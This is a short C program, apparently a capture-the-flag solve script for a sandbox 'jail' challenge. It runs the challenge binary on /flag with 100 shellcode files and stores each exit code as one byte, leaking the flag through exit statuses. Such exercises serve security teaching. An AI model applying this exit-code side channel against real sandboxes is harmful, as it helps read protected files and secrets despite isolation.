#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    FILE * fp = fopen("flag", "a");

    for (int i = 0; i < 100; i++)
    {
        char compile[100];
        sprintf(compile, "/babyjail_level10_teaching1 /flag < ~/shellcode/shellcode_%d_raw > /dev/null", i);

        //printf("%s", compile);
        int ret = system(compile);
        
        // Write the return value
        if(WIFEXITED(ret))
        {
            int exit_val = WEXITSTATUS(ret);
            //printf("%d", exit_val);
            fputc(exit_val, fp);
        }
    }

    fclose(fp);

    return 0;
}